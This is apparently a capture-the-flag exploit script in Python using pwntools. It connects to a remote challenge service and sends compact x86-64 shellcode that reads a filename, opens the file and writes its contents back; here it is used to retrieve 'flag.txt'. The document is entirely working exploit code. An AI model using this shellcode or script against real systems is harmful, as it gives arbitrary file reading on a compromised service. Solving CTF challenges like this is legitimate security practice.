from pwn import *
import time

context.binary = elf = ELF("./vuln")
#conn = process()
#gdb.attach(conn)
conn = remote("34.90.77.218", 1337)

payload = asm('''
xchg r13, rsp
lea rsi, [r13-0x1201]
xor ebx, 0x49
xchg ebx, edx
syscall

xor edi, edi
inc edi
inc edi
xchg edi, eax
lea rdi, [r13-0x1201]
xor ebx, ebx
xchg ebx, esi
xor ebx, ebx
xchg ebx, edx
syscall

xchg edi, eax
xor ebx, ebx
xchg ebx, eax
lea rsi, [r13-0x1201]
xor ebx, ebx
xor ebx, 0x49
xchg ebx, edx
syscall

xor ebx, ebx
inc ebx
xchg ebx, eax
xor edi, edi
inc edi
syscall
''')

print("Uniqueness:", len(set(payload)))
print("Length:", len(payload))

conn.sendline(payload)
time.sleep(1)
conn.sendline(b'flag.txt\0')

conn.interactive()

